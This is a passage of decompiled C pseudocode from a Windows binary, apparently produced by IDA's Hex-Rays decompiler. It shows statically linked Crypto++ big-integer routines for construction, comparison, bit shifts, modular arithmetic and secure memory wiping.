  char *v6; // edx
  int v7; // ecx
  char v8; // al
  char *Block; // [esp+1Ch] [ebp-54h]
  _DWORD v12[8]; // [esp+20h] [ebp-50h] BYREF
  _DWORD v13[8]; // [esp+40h] [ebp-30h] BYREF
  int v14; // [esp+6Ch] [ebp-4h]

  v5 = this;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  *v5 = &CryptoPP::Integer::`vftable';
  v5[2] = 0x3FFFFFFF;
  v5[3] = 0;
  v5[4] = sub_41E7A0(0, 0);
  v14 = 0;
  if ( a5 )
  {
    sub_43D9A0(v13, a2, a3);
    sub_441170((int)v5, (int)v13, a3, a4);
  }
  else
  {
    v13[5] = -1;
    v13[6] = a3;
    if ( a3 )
    {
      Block = (char *)sub_45AEA0(a3);
      v6 = Block;
    }
    else
    {
      v6 = 0;
      Block = 0;
    }
    v13[7] = v6;
    LOBYTE(v14) = 2;
    v7 = a3 + a2;
    if ( a3 < 0 )
      _invalid_parameter_noinfo_noreturn();
    for ( ; v7 != a2; *(v6 - 1) = v8 )
    {
      v8 = *(_BYTE *)(v7 - 1);
      ++v6;
      --v7;
    }
    sub_43D9A0(v12, (int)Block, a3);
    sub_441170((int)v5, (int)v12, a3, a4);
    LOBYTE(v14) = 3;
    memset(Block, 0, a3);
    j_j___free_base(Block);
    return this;
  }
  return v5;
}
// 43D64C: conditional instruction was optimized away because ebx.4<0
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;
// 43D570: using guessed type _DWORD var_50[8];

//----- (0043D6C0) --------------------------------------------------------
_DWORD *__thiscall sub_43D6C0(_DWORD *this)
{
  int v2; // eax

  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  *this = &CryptoPP::Integer::`vftable';
  this[2] = 0x3FFFFFFF;
  this[3] = 2;
  v2 = sub_41E7A0(2u, 0);
  this[4] = v2;
  this[5] = 0;
  *(_DWORD *)(v2 + 4) = 0;
  *(_DWORD *)this[4] = 0;
  return this;
}
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (0043D720) --------------------------------------------------------
void *__thiscall sub_43D720(void *this, _DWORD *a2)
{
  int v3; // eax
  bool v4; // zf
  _DWORD *v5; // eax
  unsigned int v7; // [esp-4h] [ebp-6Ch]
  unsigned int v8; // [esp-4h] [ebp-6Ch]
  char pExceptionObject[40]; // [esp+18h] [ebp-50h] BYREF
  _DWORD v10[6]; // [esp+40h] [ebp-28h] BYREF
  int v11; // [esp+64h] [ebp-4h]

  *((_DWORD *)this + 1) = &CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
  *((_DWORD *)this + 2) = this;
  *(_DWORD *)this = &CryptoPP::ModularArithmetic::`vftable';
  sub_43D420((_DWORD *)this + 3, a2);
  v7 = a2[3];
  v11 = 1;
  sub_43D360((_DWORD *)this + 9, 0, v7);
  sub_43D6C0((_DWORD *)this + 15);
  v8 = *((_DWORD *)this + 6);
  v11 = 2;
  *(_DWORD *)this = &CryptoPP::MontgomeryRepresentation::`vftable';
  sub_43D360((_DWORD *)this + 21, 0, v8);
  v3 = *((_DWORD *)this + 6);
  LOBYTE(v11) = 3;
  *((_DWORD *)this + 28) = 0x3FFFFFFF;
  *((_DWORD *)this + 29) = 5 * v3;
  *((_DWORD *)this + 30) = sub_41E7A0(5 * v3, 0);
  v4 = *((_DWORD *)this + 6) == 0;
  LOBYTE(v11) = 4;
  if ( v4 || (v5 = (_DWORD *)*((_DWORD *)this + 7), (*(_BYTE *)v5 & 1) == 0) )
  {
    sub_419B80((int)v10, "MontgomeryRepresentation: Montgomery representation requires an odd modulus");
    LOBYTE(v11) = 5;
    sub_405230(pExceptionObject, v10);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  sub_4446D0(*((_DWORD *)this + 25), *((unsigned int **)this + 30), v5, *((_DWORD *)this + 6));
  return this;
}
// 4BA46C: using guessed type void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable';
// 4BA4A4: using guessed type void *CryptoPP::ModularArithmetic::`vftable';
// 4BA514: using guessed type void *CryptoPP::MontgomeryRepresentation::`vftable';
// 43D720: using guessed type _DWORD var_28[6];

//----- (0043D840) --------------------------------------------------------
char *__thiscall sub_43D840(char *this, int a2)
{
  *(_DWORD *)this = &std::exception::`vftable';
  *(_QWORD *)(this + 4) = 0i64;
  __std_exception_copy(a2 + 4, this + 4);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *(_DWORD *)(a2 + 12);
  sub_419BE0((_DWORD *)this + 4, (_DWORD *)(a2 + 16));
  *(_DWORD *)this = &CryptoPP::Integer::RandomNumberNotFound::`vftable';
  return this;
}
// 4837C4: using guessed type _DWORD __cdecl __std_exception_copy(_DWORD, _DWORD);
// 4B83A4: using guessed type void *std::exception::`vftable';
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BAD24: using guessed type void *CryptoPP::Integer::RandomNumberNotFound::`vftable';

//----- (0043D8D0) --------------------------------------------------------
char *__thiscall sub_43D8D0(char *this)
{
  void *v2; // ecx
  int v4[5]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v5; // [esp+24h] [ebp-14h]
  int v6; // [esp+34h] [ebp-4h]

  sub_419B80((int)v4, "Integer: no integer satisfies the given parameters");
  v6 = 0;
  *(_QWORD *)(this + 4) = 0i64;
  LOBYTE(v6) = 1;
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = 6;
  sub_419BE0((_DWORD *)this + 4, v4);
  if ( v5 >= 0x10 )
  {
    v2 = (void *)v4[0];
    if ( v5 + 1 >= 0x1000 )
    {
      v2 = *(void **)(v4[0] - 4);
      if ( (unsigned int)(v4[0] - (_DWORD)v2 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v2);
  }
  *(_DWORD *)this = &CryptoPP::Integer::RandomNumberNotFound::`vftable';
  return this;
}
// 4B8910: using guessed type void *CryptoPP::Exception::`vftable';
// 4BAD24: using guessed type void *CryptoPP::Integer::RandomNumberNotFound::`vftable';

//----- (0043D9A0) --------------------------------------------------------
_DWORD *__thiscall sub_43D9A0(_DWORD *this, int a2, int a3)
{
  _DWORD *v4; // eax
  unsigned int v5; // ecx
  void *v6; // edx
  void **v8; // [esp+10h] [ebp-34h] BYREF
  void (__thiscall ***v9)(_DWORD, int); // [esp+14h] [ebp-30h]
  char v10[4]; // [esp+1Ch] [ebp-28h] BYREF
  int v11; // [esp+20h] [ebp-24h]
  int v12; // [esp+24h] [ebp-20h]
  unsigned int v13; // [esp+2Ch] [ebp-18h]
  unsigned int v14; // [esp+30h] [ebp-14h]
  void *Block; // [esp+34h] [ebp-10h]
  int v16; // [esp+40h] [ebp-4h]

  sub_435E90(this, 0);
  this[3] = -1;
  *((_BYTE *)this + 16) = 0;
  *this = &CryptoPP::StringStore::`vftable';
  this[1] = &CryptoPP::StringStore::`vftable';
  v13 = -1;
  v14 = 0;
  Block = 0;
  v11 = a2;
  v12 = a3;
  v10[0] = 0;
  v16 = 4;
  v4 = sub_422210(&v8, (int)"InputBuffer", (int)v10, 1);
  LOBYTE(v16) = 5;
  sub_454EC0(this, (int)v4);
  LOBYTE(v16) = 6;
  if ( v9 )
    (**v9)(v9, 1);
  v8 = &CryptoPP::NameValuePairs::`vftable';
  v5 = v14;
  v6 = Block;
  if ( v13 < v14 )
    v5 = v13;
  memset(Block, 0, v5);
  v16 = 7;
  j_j___free_base(v6);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA64C: using guessed type void *CryptoPP::StringStore::`vftable';
// 4BA708: using guessed type void *CryptoPP::StringStore::`vftable';
// 43D9A0: using guessed type char var_28[4];

//----- (0043DA90) --------------------------------------------------------
void __thiscall sub_43DA90(int this)
{
  unsigned int v1; // edx
  void *v2; // esi

  v1 = *(_DWORD *)(this + 24);
  v2 = *(void **)(this + 28);
  if ( *(_DWORD *)(this + 20) < v1 )
    v1 = *(_DWORD *)(this + 20);
  memset(*(void **)(this + 28), 0, 4 * v1);
  if ( v1 )
    j_j_unknown_libname_61(v2);
  else
    j_j___free_base(v2);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043DB10) --------------------------------------------------------
void __thiscall sub_43DB10(_DWORD *this)
{
  int v2; // edx
  unsigned int v3; // edx
  void *v4; // esi
  void *v5; // [esp-4h] [ebp-20h]

  v5 = (void *)this[13];
  v2 = *(_DWORD *)((char *)this + (this[11] < this[12] ? 0xFFFFFFFC : 0) + 48);
  memset(v5, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  v3 = this[6];
  if ( this[5] < v3 )
    v3 = this[5];
  v4 = (void *)this[7];
  memset(v4, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v4);
  else
    j_j___free_base(v4);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043DBB0) --------------------------------------------------------
_DWORD *__thiscall sub_43DBB0(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // edx
  _DWORD *v4; // ecx
  int v5; // ebx
  _DWORD *v6; // eax
  int v7; // eax
  _DWORD *v8; // edx

  if ( this != a2 )
  {
    v3 = a2[3];
    v4 = (_DWORD *)a2[4];
    v5 = this[3];
    if ( v5 != v3 || !v4[v3 >> 1] )
    {
      if ( v3 )
      {
        v6 = &v4[v3 - 1];
        do
        {
          if ( *v6 )
            break;
          --v6;
          --v3;
        }
        while ( v3 );
      }
      v7 = sub_444C00(v3);
      sub_443C00(this + 1, v7);
      v5 = this[3];
      v4 = (_DWORD *)a2[4];
    }
    v8 = (_DWORD *)this[4];
    if ( v8 != v4 )
      sub_438F30(v8, 4 * v5, v4, 4 * v5);
    this[5] = a2[5];
  }
  return this;
}

//----- (0043DC30) --------------------------------------------------------
_DWORD *__stdcall sub_43DC30(_DWORD *a1, unsigned int a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  unsigned int v4; // edx
  void *v5; // ebx
  _DWORD *v7; // [esp+0h] [ebp-3Ch]
  int v8; // [esp+14h] [ebp-28h] BYREF
  unsigned int v9; // [esp+1Ch] [ebp-20h]
  unsigned int v10; // [esp+20h] [ebp-1Ch]
  void *Block; // [esp+24h] [ebp-18h]
  int v12; // [esp+2Ch] [ebp-10h]
  int v13; // [esp+38h] [ebp-4h]

  v12 = 0;
  v2 = sub_43D420(&v8, v7);
  v13 = 1;
  v3 = sub_43E500(v2, a2);
  sub_43D420(a1, v3);
  v12 = 1;
  v4 = v10;
  v5 = Block;
  if ( v9 < v10 )
    v4 = v9;
  v13 = 2;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return a1;
}
// 43DC63: variable 'v7' is possibly undefined
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043DCE0) --------------------------------------------------------
char __thiscall sub_43DCE0(_DWORD *this)
{
  _DWORD *v1; // edx
  int v2; // eax
  _DWORD *i; // ecx

  if ( this[5] != 1 )
  {
    v1 = (_DWORD *)this[4];
    if ( !*v1 )
    {
      v2 = this[3];
      if ( !v2 )
        return 1;
      for ( i = &v1[v2 - 1]; !*i; --i )
      {
        if ( !--v2 )
          return 1;
      }
    }
  }
  return 0;
}
// 43DD12: conditional instruction was optimized away because eax.4!=0

//----- (0043DD20) --------------------------------------------------------
bool __cdecl sub_43DD20(_DWORD *a1, int a2)
{
  int v2; // edx

  v2 = *(_DWORD *)(a2 + 20);
  if ( a1[5] == 1 )
  {
    if ( v2 != 1 )
      return 0;
  }
  else if ( v2 == 1 )
  {
    return 0;
  }
  return sub_443E50(a1, a2) == 0;
}

//----- (0043DD70) --------------------------------------------------------
_DWORD *__cdecl sub_43DD70(_DWORD *a1, int a2, int a3)
{
  sub_43D6C0(a1);
  sub_444070((int)a1, a2, a3);
  if ( (*(_DWORD *)(a2 + 20) != 1) != (*(_DWORD *)(a3 + 20) != 1) )
    sub_443BC0(a1);
  return a1;
}

//----- (0043DE00) --------------------------------------------------------
_DWORD *__thiscall sub_43DE00(_DWORD *this)
{
  unsigned int v2; // edx
  unsigned int *v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // eax
  int v6; // eax
  int v9; // eax
  _DWORD *i; // ecx

  v2 = this[3];
  v3 = (unsigned int *)this[4];
  if ( this[5] == 1 )
  {
    sub_441320(v3, v2, 1);
    v9 = this[3];
    if ( v9 )
    {
      for ( i = (_DWORD *)(this[4] + 4 * v9 - 4); !*i; --i )
      {
        if ( !--v9 )
        {
          sub_43DBB0(this, &dword_4EEE04);
          return this;
        }
      }
    }
    else
    {
      sub_43DBB0(this, &dword_4EEE04);
    }
  }
  else
  {
    v4 = *v3;
    v5 = *v3 + 1;
    *v3 = v5;
    if ( v5 < v4 )
    {
      v6 = 1;
      if ( v2 <= 1 )
      {
LABEL_6:
        sub_440E30((int)(this + 1), 2 * this[3]);
        *(_DWORD *)(this[4] + 4 * (this[3] >> 1)) = 1;
        return this;
      }
      while ( v3[v6]++ == -1 )
      {
        if ( ++v6 >= v2 )
          goto LABEL_6;
      }
    }
  }
  return this;
}
// 43DE91: conditional instruction was optimized away because eax.4!=0
// 4EEE04: using guessed type int dword_4EEE04;

//----- (0043DEB0) --------------------------------------------------------
_DWORD *__thiscall sub_43DEB0(_DWORD *this)
{
  unsigned int v2; // edx
  unsigned int *v3; // edi
  unsigned int v4; // ecx
  unsigned int v5; // eax
  int v6; // eax
  _DWORD *v9; // eax
  _DWORD v10[9]; // [esp+Ch] [ebp-24h] BYREF

  v2 = this[3];
  v3 = (unsigned int *)this[4];
  if ( this[5] == 1 )
  {
    v4 = *v3;
    v5 = *v3 + 1;
    *v3 = v5;
    if ( v5 < v4 )
    {
      v6 = 1;
      if ( v2 <= 1 )
      {
LABEL_6:
        sub_440E30((int)(this + 1), 2 * this[3]);
        *(_DWORD *)(this[4] + 4 * (this[3] >> 1)) = 1;
        return this;
      }
      while ( v3[v6]++ == -1 )
      {
        if ( ++v6 >= v2 )
          goto LABEL_6;
      }
    }
  }
  else if ( sub_441320(v3, v2, 1) )
  {
    v9 = sub_43E040(&dword_4EEE1C, v10);
    v10[8] = 0;
    sub_43DBB0(this, v9);
    sub_4066A0((int)v10);
  }
  return this;
}
// 4EEE1C: using guessed type int dword_4EEE1C;

//----- (0043DF90) --------------------------------------------------------
_DWORD *__cdecl sub_43DF90(_DWORD *a1, int a2, int a3)
{
  unsigned int v3; // eax
  int v4; // eax
  int v6; // [esp-Ch] [ebp-2Ch]
  int v7; // [esp-8h] [ebp-28h]
  int v8; // [esp-4h] [ebp-24h]

  v3 = *(_DWORD *)(a2 + 12);
  if ( v3 < *(_DWORD *)(a3 + 12) )
    v3 = *(_DWORD *)(a3 + 12);
  sub_43D360(a1, 0, v3);
  v4 = *(_DWORD *)(a3 + 20);
  if ( *(_DWORD *)(a2 + 20) == 1 )
  {
    if ( v4 != 1 )
    {
      sub_443D00((int)a1, a2, a3);
      a1[5] = 1;
      return a1;
    }
    v8 = a2;
    v7 = a3;
    v6 = (int)a1;
LABEL_9:
    sub_444260(v6, v7, v8);
    return a1;
  }
  v8 = a3;
  v7 = a2;
  v6 = (int)a1;
  if ( v4 != 1 )
    goto LABEL_9;
  sub_443D00((int)a1, a2, a3);
  return a1;
}

//----- (0043E040) --------------------------------------------------------
_DWORD *__thiscall sub_43E040(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // eax
  int v3; // ecx
  _DWORD *i; // edx

  sub_43D420(a2, this);
  if ( a2[5] == 1 || (v2 = (_DWORD *)a2[4], *v2) )
  {
LABEL_8:
    a2[5] = 1 - a2[5];
    return a2;
  }
  v3 = a2[3];
  if ( v3 )
  {
    for ( i = &v2[v3 - 1]; !*i; --i )
    {
      if ( !--v3 )
        return a2;
    }
    goto LABEL_8;
  }
  return a2;
}
// 43E07D: conditional instruction was optimized away because ecx.4!=0

//----- (0043E090) --------------------------------------------------------
_DWORD *__cdecl sub_43E090(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  unsigned int v4; // edx
  void *v5; // ebx
  void **v7; // [esp+10h] [ebp-28h] BYREF
  unsigned int v8; // [esp+18h] [ebp-20h]
  unsigned int v9; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v11; // [esp+24h] [ebp-14h]
  int v12; // [esp+28h] [ebp-10h]
  int v13; // [esp+34h] [ebp-4h]

  v12 = 0;
  v13 = 0;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v7 = &CryptoPP::Integer::`vftable';
  v8 = 0x3FFFFFFF;
  v9 = 2;
  v3 = (_DWORD *)sub_41E7A0(2u, 0);
  Block = v3;
  v11 = 0;
  v3[1] = 0;
  *v3 = 0;
  v13 = 1;
  sub_43D6C0(a1);
  v12 = 2;
  sub_441740(&v7, a1, a2, a3);
  v4 = v9;
  v5 = Block;
  if ( v8 < v9 )
    v4 = v8;
  v13 = 2;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return a1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (0043E190) --------------------------------------------------------
unsigned int __cdecl sub_43E190(_DWORD *a1, int a2)
{
  int v2; // edx

  v2 = *(_DWORD *)(a2 + 20);
  if ( a1[5] == 1 )
  {
    return v2 != 1 || sub_443E50(a1, a2) > 0;
  }
  else if ( v2 == 1 )
  {
    return 0;
  }
  else
  {
    return (unsigned int)sub_443E50(a1, a2) >> 31;
  }
}

//----- (0043E1E0) --------------------------------------------------------
bool __cdecl sub_43E1E0(_DWORD *a1, int a2)
{
  int v2; // edx

  v2 = *(_DWORD *)(a2 + 20);
  if ( a1[5] == 1 )
    return v2 == 1 && sub_443E50(a1, a2) < 0;
  else
    return v2 == 1 || sub_443E50(a1, a2) > 0;
}

//----- (0043E230) --------------------------------------------------------
bool __cdecl sub_43E230(_DWORD *a1, int a2)
{
  int v2; // edx

  v2 = *(_DWORD *)(a2 + 20);
  if ( a1[5] == 1 )
    return v2 == 1 && sub_443E50(a1, a2) <= 0;
  else
    return v2 == 1 || sub_443E50(a1, a2) >= 0;
}

//----- (0043E280) --------------------------------------------------------
_DWORD *__thiscall sub_43E280(_DWORD *this, int a2)
{
  _DWORD *v3; // eax
  unsigned int v4; // edi
  void *v5; // esi
  int v6; // eax
  _DWORD *v7; // ecx
  _DWORD *v8; // ebx
  void **v10; // [esp+10h] [ebp-28h] BYREF
  unsigned int v11; // [esp+18h] [ebp-20h]
  int v12; // [esp+1Ch] [ebp-1Ch]
  void *Block; // [esp+20h] [ebp-18h]
  int v14; // [esp+24h] [ebp-14h]
  int v15; // [esp+28h] [ebp-10h]
  int v16; // [esp+34h] [ebp-4h]

  v15 = 0;
  v16 = 0;
  if ( !byte_4EEDFC )
  {
    sub_44D8F0();
    byte_4EEDFC = 1;
  }
  v10 = &CryptoPP::Integer::`vftable';
  v11 = 0x3FFFFFFF;
  v12 = 2;
  v3 = (_DWORD *)sub_41E7A0(2u, 0);
  Block = v3;
  v3[1] = 0;
  *v3 = 0;
  v14 = 0;
  v15 = 1;
  sub_444070((int)&v10, (int)this, a2);
  v4 = v12;
  v5 = Block;
  if ( (this[5] != 1) != (*(_DWORD *)(a2 + 20) != 1) )
  {
    if ( v14 == 1 || *(_DWORD *)Block )
      goto LABEL_12;
    v6 = v12;
    if ( v12 )
    {
      v7 = (char *)Block + 4 * v12 - 4;
      while ( !*v7 )
      {
        --v7;
        if ( !--v6 )
          goto LABEL_13;
      }
      if ( v6 )
LABEL_12:
        v14 = 1 - v14;
    }
  }
LABEL_13:
  v8 = sub_43DBB0(this, &v10);
  v16 = 1;
  if ( v11 < v4 )
    v4 = v11;
  memset(v5, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return v8;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BAD30: using guessed type void *CryptoPP::Integer::`vftable';
// 4EEDFC: using guessed type char byte_4EEDFC;

//----- (0043E3C0) --------------------------------------------------------
int __thiscall sub_43E3C0(int this, int a2)
{
  unsigned int v3; // ebp
  unsigned int v4; // eax
  char *v5; // eax
  int v6; // edx
  int v7; // eax
  int v9; // [esp-Ch] [ebp-1Ch]
  int v10; // [esp-8h] [ebp-18h]
  int v11; // [esp-4h] [ebp-14h]

  v3 = *(_DWORD *)(a2 + 12);
  v4 = *(_DWORD *)(this + 12);
  if ( v3 > v4 )
  {
    v5 = (char *)sub_43CD80(*(void **)(this + 16), v4, v3, 1);
    v6 = *(_DWORD *)(this + 12);
    *(_DWORD *)(this + 16) = v5;
    memset(&v5[4 * v6], 0, 4 * (v3 - v6));
    *(_DWORD *)(this + 12) = v3;
  }
  *(_DWORD *)(this + 8) = 0x3FFFFFFF;
  v7 = *(_DWORD *)(a2 + 20);
  if ( *(_DWORD *)(this + 20) != 1 )
  {
    v11 = a2;
    v10 = this;
    v9 = this;
    if ( v7 != 1 )
    {
      sub_443D00(this, this, a2);
      return this;
    }
    goto LABEL_8;
  }
  if ( v7 != 1 )
  {
    v11 = this;
    v10 = a2;
    v9 = this;
LABEL_8:
    sub_444260(v9, v10, v11);
    return this;
  }
  sub_443D00(this, this, a2);
  *(_DWORD *)(this + 20) = 1;
  return this;
}

//----- (0043E460) --------------------------------------------------------
int __thiscall sub_43E460(int this, int a2)
{
  unsigned int v3; // ebp
  unsigned int v4; // eax
  char *v5; // eax
  int v6; // edx
  int v7; // eax
  int v9; // [esp-Ch] [ebp-1Ch]
  int v10; // [esp-8h] [ebp-18h]
  int v11; // [esp-4h] [ebp-14h]

  v3 = *(_DWORD *)(a2 + 12);
  v4 = *(_DWORD *)(this + 12);
  if ( v3 > v4 )
  {
    v5 = (char *)sub_43CD80(*(void **)(this + 16), v4, v3, 1);
    v6 = *(_DWORD *)(this + 12);
    *(_DWORD *)(this + 16) = v5;
    memset(&v5[4 * v6], 0, 4 * (v3 - v6));
    *(_DWORD *)(this + 12) = v3;
  }
  *(_DWORD *)(this + 8) = 0x3FFFFFFF;
  v7 = *(_DWORD *)(a2 + 20);
  if ( *(_DWORD *)(this + 20) == 1 )
  {
    if ( v7 != 1 )
    {
      sub_443D00(this, this, a2);
      *(_DWORD *)(this + 20) = 1;
      return this;
    }
    v11 = this;
    v10 = a2;
    v9 = this;
  }
  else
  {
    v11 = a2;
    v10 = this;
    v9 = this;
    if ( v7 == 1 )
    {
      sub_443D00(this, this, a2);
      return this;
    }
  }
  sub_444260(v9, v10, v11);
  return this;
}

//----- (0043E500) --------------------------------------------------------
_DWORD *__thiscall sub_43E500(_DWORD *this, unsigned int a2)
{
  unsigned int v3; // esi
  int v4; // ecx
  _DWORD *v5; // eax
  int v6; // eax
  _DWORD *v7; // ecx

  v3 = this[3];
  v4 = this[4];
  if ( v3 )
  {
    v5 = (_DWORD *)(v4 + 4 * (v3 - 1));
    do
    {
      if ( *v5 )
        break;
      --v5;
      --v3;
    }
    while ( v3 );
  }
  sub_44DB00(v4, v3, a2 >> 5);
  if ( v3 > a2 >> 5 )
    sub_44DAA0(this[4], v3 - (a2 >> 5), a2 & 0x1F);
  if ( this[5] == 1 )
  {
    v6 = this[3];
    if ( v6 )
    {
      v7 = (_DWORD *)(this[4] + 4 * v6 - 4);
      while ( !*v7 )
      {
        --v7;
        if ( !--v6 )
          goto LABEL_14;
      }
    }
    else
    {
LABEL_14:
      sub_43DBB0(this, &dword_4EEE04);
    }
  }
  return this;
}
// 43E574: conditional instruction was optimized away because eax.4!=0
// 4EEE04: using guessed type int dword_4EEE04;

//----- (0043E590) --------------------------------------------------------
int __thiscall sub_43E590(int this, unsigned int a2)
{
  int v3; // esi
  _DWORD *v4; // eax
  int v6; // ecx
  unsigned int v7; // eax
  unsigned int v8; // edi
  unsigned int v9; // eax
  char *v10; // eax
  int v11; // edx
  unsigned int v12; // ebx
  _DWORD *v13; // edi
  unsigned int v14; // edx
  int *v15; // ecx
  int v16; // eax
  unsigned int v18; // [esp+10h] [ebp-8h] BYREF
  int v19; // [esp+14h] [ebp-4h]
  unsigned int v20; // [esp+1Ch] [ebp+4h]

  v3 = *(_DWORD *)(this + 12);
  if ( v3 )
  {
    v4 = (_DWORD *)(*(_DWORD *)(this + 16) + 4 * v3 - 4);
    do
    {
      if ( *v4 )
        break;
      --v4;
      --v3;
    }
    while ( v3 );
  }
  v20 = a2 >> 5;
  v6 = a2 & 0x1F;
  v7 = v3 + ((a2 + 31) >> 5);
  v19 = v6;
  if ( v7 > 8 )
  {
    if ( v7 > 0x10 )
    {
      if ( v7 > 0x20 )
      {
        if ( v7 > 0x40 )
        {
          v18 = v7 - 1;
          v8 = 1 << sub_4327F0(&v18);
        }
        else
        {
          v8 = 64;
        }
      }
      else
      {
        v8 = 32;
      }
    }
    else
    {
      v8 = 16;
    }
  }
  else
  {
    v8 = dword_4BACF0[v7];
  }
  v9 = *(_DWORD *)(this + 12);
  if ( v8 > v9 )
  {
    v10 = (char *)sub_43CD80(*(void **)(this + 16), v9, v8, 1);
    v11 = *(_DWORD *)(this + 12);
    *(_DWORD *)(this + 16) = v10;
    memset(&v10[4 * v11], 0, 4 * (v8 - v11));
    *(_DWORD *)(this + 12) = v8;
  }
  v12 = v20;
  *(_DWORD *)(this + 8) = 0x3FFFFFFF;
  v13 = *(_DWORD **)(this + 16);
  if ( v3 + v12 < v12 )
    v12 = v3 + v20;
  if ( v12 )
  {
    v14 = v3 + v20 - 1;
    if ( v14 >= v12 )
    {
      v15 = &v13[v14 - v12];
      do
      {
        v16 = *v15--;
        v13[v14--] = v16;
      }
      while ( v14 >= v12 );
    }
    memset(v13, 0, 4 * v12);
  }
  sub_44DA50(*(_DWORD *)(this + 16) + 4 * v20, v3 + ((unsigned int)(v19 + 31) >> 5), v19);
  return this;
}
// 43E694: conditional instruction was optimized away because ebx.4!=0
// 4BACF0: using guessed type int dword_4BACF0[9];

//----- (0043E6D0) --------------------------------------------------------
_DWORD *__thiscall sub_43E6D0(_DWORD *this, char a2)
{
  sub_43DB10(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0043E6F0) --------------------------------------------------------
int __thiscall sub_43E6F0(int this, char a2)
{
  unsigned int v3; // edx
  void *v4; // ebx

  v3 = *(_DWORD *)(this + 12);
  v4 = *(void **)(this + 16);
  if ( *(_DWORD *)(this + 8) < v3 )
    v3 = *(_DWORD *)(this + 8);
  memset(*(void **)(this + 16), 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v4);
  else
    j_j___free_base(v4);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0043E770) --------------------------------------------------------
int __thiscall sub_43E770(int this, char a2)
{
  unsigned int v3; // eax
  unsigned int v4; // ecx
  void *v5; // edx

  v3 = *(_DWORD *)(this + 12);
  v4 = *(_DWORD *)(this + 16);
  v5 = *(void **)(this + 20);
  if ( v3 < v4 )
    v4 = v3;
  memset(*(void **)(this + 20), 0, v4);
  j_j___free_base(v5);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}

//----- (0043E7E0) --------------------------------------------------------
int __stdcall sub_43E7E0(int a1, int a2)
{
  return sub_43E3C0(a1, a2);
}

//----- (0043E7F0) --------------------------------------------------------
_DWORD *__thiscall sub_43E7F0(_DWORD *this, _DWORD *a2, int a3)
{
  int v4; // edx
  int v6; // eax
  int v7; // edi
  int v8; // eax

  v4 = this[6];
  if ( a2[3] != v4 || *(_DWORD *)(a3 + 12) != v4 )
  {
    sub_43E3C0((int)a2, a3);
    v6 = this[8];
    v7 = (int)(this + 3);
    if ( a2[5] == 1 )
    {
      if ( v6 != 1 )
        return a2;
      v8 = -sub_443E50(a2, v7);
    }
    else
    {
      if ( v6 == 1 )
        goto LABEL_12;
      v8 = sub_443E50(a2, v7);
    }
    if ( v8 < 0 )
      return a2;
LABEL_12:
    sub_43E460((int)a2, v7);
    return a2;
  }
  if ( off_4E802C(a2[4], *(_DWORD *)(a3 + 16)) || sub_440EF0(a2[4], this[7], a2[3]) >= 0 )
  {
    off_4E8030(a2[4], this[7]);
    return a2;
  }
  return a2;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (0043E890) --------------------------------------------------------
_DWORD *__thiscall sub_43E890(_DWORD *this, _DWORD *a2, int a3)
{
  _DWORD *v4; // ebx
  unsigned int v5; // edx
  void *v6; // esi
  _DWORD v8[2]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-1Ch]
  unsigned int v10; // [esp+1Ch] [ebp-18h]
  void *Block; // [esp+20h] [ebp-14h]
  int v12; // [esp+30h] [ebp-4h]

  sub_443C50(a2, v8, a3);
  v12 = 0;
  v4 = sub_43DBB0(this + 9, v8);
  v5 = v10;
  v6 = Block;
